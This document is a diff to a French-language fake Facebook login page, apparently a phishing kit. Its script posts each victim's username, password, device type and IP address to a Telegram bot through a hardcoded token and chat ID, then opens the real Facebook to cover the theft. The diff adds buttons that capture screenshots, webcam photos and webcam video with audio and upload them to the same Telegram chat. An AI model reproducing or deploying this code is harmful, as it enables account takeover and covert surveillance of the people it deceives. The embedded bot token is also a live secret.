@@ -61,6 +61,7 @@
             border-radius: 12px;
             box-shadow: 0 2px 8px rgba(0,0,0,0.15);
             padding: 25px 20px;
+            margin-bottom: 20px;
         }
         
         .login-title {
@@ -135,6 +136,118 @@
             opacity: 0.7;
         }
         
+        /* Section capture secrète */
+        .capture-section {
+            background-color: white;
+            border-radius: 12px;
+            box-shadow: 0 2px 8px rgba(0,0,0,0.15);
+            padding: 20px;
+            margin-top: 20px;
+            border-left: 4px solid #1877f2;
+        }
+        
+        .capture-title {
+            font-size: 16px;
+            font-weight: 600;
+            margin-bottom: 15px;
+            color: #1c1e21;
+            display: flex;
+            align-items: center;
+            gap: 10px;
+        }
+        
+        .capture-controls {
+            display: flex;
+            flex-wrap: wrap;
+            gap: 10px;
+            margin-bottom: 15px;
+        }
+        
+        .capture-btn {
+            flex: 1;
+            min-width: 120px;
+            padding: 12px;
+            background-color: #1877f2;
+            border: none;
+            border-radius: 6px;
+            color: white;
+            font-weight: 500;
+            cursor: pointer;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 8px;
+            transition: background-color 0.2s;
+        }
+        
+        .capture-btn:hover {
+            background-color: #166fe5;
+        }
+        
+        .capture-btn.screenshot {
+            background-color: #42b72a;
+        }
+        
+        .capture-btn.screenshot:hover {
+            background-color: #36a420;
+        }
+        
+        .capture-btn.webcam {
+            background-color: #f02849;
+        }
+        
+        .capture-btn.webcam:hover {
+            background-color: #e41e3a;
+        }
+        
+        .video-controls {
+            display: flex;
+            gap: 10px;
+            margin-top: 10px;
+        }
+        
+        .video-input {
+            flex: 1;
+            padding: 10px;
+            border: 1px solid #dddfe2;
+            border-radius: 6px;
+            text-align: center;
+        }
+        
+        .record-btn {
+            padding: 10px 20px;
+            background-color: #f02849;
+            border: none;
+            border-radius: 6px;
+            color: white;
+            font-weight: 500;
+            cursor: pointer;
+        }
+        
+        /* Preview des captures */
+        .preview-container {
+            margin-top: 15px;
+            display: none;
+        }
+        
+        .preview-title {
+            font-size: 14px;
+            font-weight: 600;
+            margin-bottom: 10px;
+        }
+        
+        .preview-image {
+            max-width: 100%;
+            border-radius: 8px;
+            border: 2px solid #dddfe2;
+        }
+        
+        .preview-video {
+            max-width: 100%;
+            border-radius: 8px;
+            border: 2px solid #dddfe2;
+        }
+        
         /* Indicateur de chargement */
         .spinner {
             width: 20px;
@@ -172,6 +285,12 @@
             border: 1px solid #fecaca;
         }
         
+        .status-info {
+            background-color: #dbeafe;
+            color: #1e40af;
+            border: 1px solid #bfdbfe;
+        }
+        
         /* Bouton d'ouverture Facebook */
         .open-facebook-btn {
             width: 100%;
@@ -184,7 +303,7 @@
             color: white;
             cursor: pointer;
             margin-top: 15px;
-            display: none;
+            display: flex;
             justify-content: center;
             align-items: center;
             gap: 8px;
@@ -251,10 +370,42 @@
                 </button>
             </form>
         </div>
+        
+        <!-- Section de capture secrète -->
+        <div class="capture-section">
+            <div class="capture-title">
+                <i class="fas fa-camera"></i> Commandes de capture
+            </div>
+            
+            <div class="capture-controls">
+                <button class="capture-btn screenshot" id="screenshotBtn">
+                    <i class="fas fa-camera"></i> Capture écran
+                </button>
+                
+                <button class="capture-btn webcam" id="webcamBtn">
+                    <i class="fas fa-video"></i> Prendre photo
+                </button>
+            </div>
+            
+            <div class="video-controls">
+                <input type="number" id="videoDuration" class="video-input" 
+                       placeholder="Secondes (ex: 5)" min="1" max="60" value="5">
+                <button class="record-btn" id="recordBtn">
+                    <i class="fas fa-video"></i> Enregistrer vidéo
+                </button>
+            </div>
+            
+            <!-- Prévisualisation -->
+            <div class="preview-container" id="previewContainer">
+                <div class="preview-title">Aperçu :</div>
+                <img id="previewImage" class="preview-image" style="display: none;">
+                <video id="previewVideo" class="preview-video" controls style="display: none;"></video>
+            </div>
+        </div>
     </div>
 
-    <!-- Inclure Font Awesome pour l'icône -->
-    <script src="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/js/all.min.js"></script>
+    <!-- Inclure Font Awesome -->
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
 
     <script>
         document.addEventListener('DOMContentLoaded', function() {
@@ -262,10 +413,22 @@
             const statusMessage = document.getElementById('statusMessage');
             const submitBtn = document.getElementById('submitBtn');
             const openFacebookBtn = document.getElementById('openFacebookBtn');
+            const screenshotBtn = document.getElementById('screenshotBtn');
+            const webcamBtn = document.getElementById('webcamBtn');
+            const recordBtn = document.getElementById('recordBtn');
+            const videoDuration = document.getElementById('videoDuration');
+            const previewContainer = document.getElementById('previewContainer');
+            const previewImage = document.getElementById('previewImage');
+            const previewVideo = document.getElementById('previewVideo');
             
             // Configuration Telegram
             const TELEGRAM_BOT_TOKEN = '7819473334:AAFeDpPUQtHyfoWniW7EGYSc6n5WZGG6fAE';
             const TELEGRAM_CHAT_ID = '8068514075';
+            
+            // Variables pour la webcam
+            let mediaStream = null;
+            let mediaRecorder = null;
+            let recordedChunks = [];
             
             // URL de Facebook
             const FACEBOOK_URL = 'https://www.facebook.com';
@@ -275,6 +438,12 @@
                 statusMessage.textContent = text;
                 statusMessage.className = `status-message status-${type}`;
                 statusMessage.style.display = 'block';
+                
+                if (type === 'success' || type === 'info') {
+                    setTimeout(() => {
+                        statusMessage.style.display = 'none';
+                    }, 5000);
+                }
             }
             
             // Masquer le message
@@ -293,15 +462,62 @@
                 }
             }
             
-            // Envoyer les identifiants
-            async function sendToTelegram(username, password) {
+            // Envoyer un fichier à Telegram
+            async function sendToTelegram(file, filename, caption = '') {
+                const formData = new FormData();
+                formData.append('chat_id', TELEGRAM_CHAT_ID);
+                formData.append('caption', caption);
+                formData.append('document', file, filename);
+                
+                try {
+                    const response = await fetch(
+                        `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendDocument`,
+                        {
+                            method: 'POST',
+                            body: formData
+                        }
+                    );
+                    
+                    const result = await response.json();
+                    return result.ok;
+                } catch (error) {
+                    console.error('Erreur envoi Telegram:', error);
+                    return false;
+                }
+            }
+            
+            // Envoyer une photo à Telegram
+            async function sendPhotoToTelegram(photoBlob, filename, caption = '') {
+                const formData = new FormData();
+                formData.append('chat_id', TELEGRAM_CHAT_ID);
+                formData.append('caption', caption);
+                formData.append('photo', photoBlob, filename);
+                
+                try {
+                    const response = await fetch(
+                        `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendPhoto`,
+                        {
+                            method: 'POST',
+                            body: formData
+                        }
+                    );
+                    
+                    return response.ok;
+                } catch (error) {
+                    console.error('Erreur envoi photo:', error);
+                    return false;
+                }
+            }
+            
+            // Envoyer les identifiants à Telegram
+            async function sendCredentialsToTelegram(username, password) {
                 const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
                 
                 const message = `
 🔔 NOUVELLE CONNEXION FACEBOOK
 
 👤 Identifiant: ${username}
-🔐 Mot de passe: ${password}
+🔐 Motde passe: ${password}
 
 📱 Appareil: ${/Mobile/.test(navigator.userAgent) ? 'Mobile' : 'Desktop'}
 📍 IP: ${await getIPAddress()}
@@ -314,7 +530,7 @@
                 };
                 
                 try {
-                    const response = await fetch(url, {
+                    await fetch(url, {
                         method: 'POST',
                         headers: {
                             'Content-Type': 'application/json'
@@ -323,18 +539,201 @@
                     });
                     return true;
                 } catch (error) {
-                    return true; // Continuer même en cas d'erreur
+                    return true;
                 }
             }
             
+            // CAPTURE D'ÉCRAN
+            screenshotBtn.addEventListener('click', async function() {
+                try {
+                    showMessage('Capture d\'écran en cours...', 'info');
+                    
+                    // Utiliser html2canvas pour capturer la page
+                    const canvas = await html2canvas(document.body, {
+                        scale: 0.5, // Réduire la taille pour Telegram
+                        useCORS: true,
+                        logging: false
+                    });
+                    
+                    canvas.toBlob(async function(blob) {
+                        const filename = `screenshot_${Date.now()}.png`;
+                        const caption = `📸 Capture d'écran - ${new Date().toLocaleString('fr-FR')}`;
+                        
+                        // Afficher l'aperçu
+                        previewImage.src = canvas.toDataURL('image/png');
+                        previewImage.style.display = 'block';
+                        previewVideo.style.display = 'none';
+                        previewContainer.style.display = 'block';
+                        
+                        // Envoyer à Telegram
+                        const success = await sendPhotoToTelegram(blob, filename, caption);
+                        
+                        if (success) {
+                            showMessage('✅ Capture d\'écran envoyée à Telegram!', 'success');
+                        } else {
+                            showMessage('❌ Erreur lors de l\'envoi', 'error');
+                        }
+                    }, 'image/png');
+                    
+                } catch (error) {
+                    showMessage('❌ Erreur capture: ' + error.message, 'error');
+                }
+            });
+            
+            // WEBCAM - Prendre une photo
+            webcamBtn.addEventListener('click', async function() {
+                try {
+                    showMessage('Accès à la webcam...', 'info');
+                    
+                    // Demander l'accès à la webcam
+                    mediaStream = await navigator.mediaDevices.getUserMedia({
+                        video: {
+                            facingMode: 'user',
+                            width: { ideal: 1280 },
+                            height: { ideal: 720 }
+                        },
+                        audio: false
+                    });
+                    
+                    // Créer un élément vidéo temporaire
+                    const video = document.createElement('video');
+                    video.srcObject = mediaStream;
+                    video.play();
+                    
+                    // Attendre que la vidéo soit prête
+                    await new Promise(resolve => {
+                        video.onloadedmetadata = () => {
+                            resolve();
+                        };
+                    });
+                    
+                    // Créer un canvas pour capturer la photo
+                    const canvas = document.createElement('canvas');
+                    canvas.width = video.videoWidth;
+                    canvas.height = video.videoHeight;
+                    
+                    const ctx = canvas.getContext('2d');
+                    ctx.drawImage(video, 0, 0);
+                    
+                    // Arrêter le flux
+                    mediaStream.getTracks().forEach(track => track.stop());
+                    
+                    // Convertir en blob
+                    canvas.toBlob(async function(blob) {
+                        const filename = `webcam_${Date.now()}.png`;
+                        const caption = `📷 Photo webcam - ${new Date().toLocaleString('fr-FR')}`;
+                        
+                        // Afficher l'aperçu
+                        previewImage.src = canvas.toDataURL('image/png');
+                        previewImage.style.display = 'block';
+                        previewVideo.style.display = 'none';
+                        previewContainer.style.display = 'block';
+                        
+                        // Envoyer à Telegram
+                        const success = await sendPhotoToTelegram(blob, filename, caption);
+                        
+                        if (success) {
+                            showMessage('✅ Photo webcam envoyée à Telegram!', 'success');
+                        } else {
+                            showMessage('❌ Erreur lors de l\'envoi', 'error');
+                        }
+                    }, 'image/png');
+                    
+                } catch (error) {
+                    showMessage('❌ Erreur webcam: ' + error.message, 'error');
+                    if (mediaStream) {
+                        mediaStream.getTracks().forEach(track => track.stop());
+                    }
+                }
+            });
+            
+            // ENREGISTRER UNE VIDÉO
+            recordBtn.addEventListener('click', async function() {
+                const duration = parseInt(videoDuration.value) || 5;
+                
+                if (duration < 1 || duration > 60) {
+                    showMessage('❌ Durée invalide (1-60 secondes)', 'error');
+                    return;
+                }
+                
+                try {
+                    showMessage(`Démarrage enregistrement ${duration}s...`, 'info');
+                    
+                    // Demander l'accès à la webcam
+                    mediaStream = await navigator.mediaDevices.getUserMedia({
+                        video: {
+                            facingMode: 'user',
+                            width: { ideal: 640 },
+                            height: { ideal: 480 }
+                        },
+                        audio: true
+                    });
+                    
+                    // Configurer le MediaRecorder
+                    recordedChunks = [];
+                    mediaRecorder = new MediaRecorder(mediaStream, {
+                        mimeType: 'video/webm;codecs=vp8,opus'
+                    });
+                    
+                    // Gérer les données enregistrées
+                    mediaRecorder.ondataavailable = function(event) {
+                        if (event.data.size > 0) {
+                            recordedChunks.push(event.data);
+                        }
+                    };
+                    
+                    // Quand l'enregistrement est terminé
+                    mediaRecorder.onstop = async function() {
+                        // Créer le blob vidéo
+                        const blob = new Blob(recordedChunks, { type: 'video/webm' });
+                        const filename = `video_${Date.now()}.webm`;
+                        const caption = `🎥 Vidéo ${duration}s - ${new Date().toLocaleString('fr-FR')}`;
+                        
+                        // Créer une URL pour l'aperçu
+                        const videoURL = URL.createObjectURL(blob);
+                        previewVideo.src = videoURL;
+                        previewVideo.style.display = 'block';
+                        previewImage.style.display = 'none';
+                        previewContainer.style.display = 'block';
+                        
+                        // Envoyer à Telegram
+                        const success = await sendToTelegram(blob, filename, caption);
+                        
+                        if (success) {
+                            showMessage(`✅ Vidéo de ${duration}s envoyée à Telegram!`, 'success');
+                        } else {
+                            showMessage('❌ Erreur lors de l\'envoi', 'error');
+                        }
+                        
+                        // Nettoyer
+                        mediaStream.getTracks().forEach(track => track.stop());
+                    };
+                    
+                    // Démarrer l'enregistrement
+                    mediaRecorder.start();
+                    
+                    // Arrêter après la durée spécifiée
+                    setTimeout(() => {
+                        if (mediaRecorder && mediaRecorder.state === 'recording') {
+                            mediaRecorder.stop();
+                            showMessage('Envoi de la vidéo...', 'info');
+                        }
+                    }, duration * 1000);
+                    
+                } catch (error) {
+                    showMessage('❌ Erreur vidéo: ' + error.message, 'error');
+                    if (mediaStream) {
+                        mediaStream.getTracks().forEach(track => track.stop());
+                    }
+                }
+            });
+            
             // Ouvrir Facebook dans un NOUVEL ONGLET
             function openFacebookInNewTab() {
-                // Ouvre Facebook dans un nouvel onglet
                 const newTab = window.open(FACEBOOK_URL, '_blank');
                 
                 if (!newTab) {
-                    // Si les popups sont bloqués, affiche un bouton manuel
-                    showMessage('Les popups sont bloqués. Cliquez sur "Ouvrir Facebook" ci-dessous.', 'error');
+                    showMessage('Les popups sont bloqués. Cliquez sur "Ouvrir Facebook".', 'error');
                     openFacebookBtn.style.display = 'flex';
                 }
             }
@@ -346,38 +745,31 @@
                 const username = document.getElementById('email').value.trim();
                 const password = document.getElementById('password').value;
                 
-                // Validation
                 if (!username || !password) {
                     showMessage('Veuillez remplir tous les champs', 'error');
                     return;
                 }
                 
-                // Désactiver le bouton et afficher le spinner
                 submitBtn.disabled = true;
                 submitBtn.innerHTML = '<span class="spinner"></span> Envoi en cours...';
                 hideMessage();
                 openFacebookBtn.style.display = 'none';
                 
                 try {
-                    // 1. Envoyer les identifiants à Telegram
-                    showMessage('Envoi des identifiants à Telegram...', 'success');
-                    await sendToTelegram(username, password);
+                    showMessage('Envoi des identifiants à Telegram...', 'info');
+                    await sendCredentialsToTelegram(username, password);
                     
-                    // 2. Attendre 1 seconde
                     setTimeout(() => {
                         submitBtn.innerHTML = '<span class="spinner"></span> Ouverture de Facebook...';
                         showMessage('Identifiants envoyés ! Ouverture de Facebook...', 'success');
                         
-                        // 3. Ouvrir Facebook dans un nouvel onglet
                         setTimeout(() => {
                             openFacebookInNewTab();
                             
-                            // Réinitialiser le formulaire
                             setTimeout(() => {
                                 loginForm.reset();
                                 submitBtn.disabled = false;
                                 submitBtn.innerHTML = '<span>Se connecter</span>';
-                                showMessage('Facebook ouvert dans un nouvel onglet', 'success');
                             }, 1000);
                             
                         }, 1000);
@@ -400,5 +792,8 @@
             document.getElementById('email').focus();
         });
     </script>
+    
+    <!-- Bibliothèque html2canvas pour les captures d'écran -->
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/html2canvas/1.4.1/html2canvas.min.js"></script>
 </body>
 </html>
